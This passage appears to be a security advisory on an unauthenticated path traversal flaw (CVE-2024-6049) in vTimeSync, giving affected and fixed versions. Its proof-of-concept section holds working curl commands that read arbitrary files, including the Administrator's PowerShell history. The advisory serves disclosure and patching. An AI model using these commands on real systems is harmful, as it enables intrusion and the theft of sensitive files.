Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.

Vulnerability overview/description:
-----------------------------------
1) Unauthenticated Path Traversal Vulnerability (CVE-2024-6049)
The web interface of vsm LTC Time Sync (vTimeSync) is vulnerable to a path
traversal vulnerability. By sending a specially crafted HTTP request, an
unauthenticated remote attacker can download arbitrary files from the vulnerable
system. As a limitation, the exploitation is only possible if the requested file
has a file extension, e.g. .exe or .txt.

The web server is running with highest SYSTEM privileges per default, which
enables an attacker to gain access to privileged files.

Proof of concept:
-----------------
1) Unauthenticated Path Traversal Vulnerability (CVE-2024-6049)
To exploit the vulnerability it is sufficient to use the following curl-command
to send a request to the vulnerable web server:

curl http://$host:8033/.../.../.../.../.../.../.../.../.../<Path to file>

For example, the following command can be used to request the default file
win.ini:

curl http://$host:8033/.../.../.../.../.../.../.../.../.../Windows/win.ini

If the application is running with SYSTEM-privileges (default), the following
command can be used to exfiltrate the Powershell history of the Windows
administrator, which might leak sensitive information:

curl
http://$host:8033/.../.../.../.../.../.../.../.../.../Users/Administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt

Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available
at the time of the test:
* 4.4.12.0

According to the vendor, versions before 4.5 are affected and v4.5.6.0
includes the fixes.
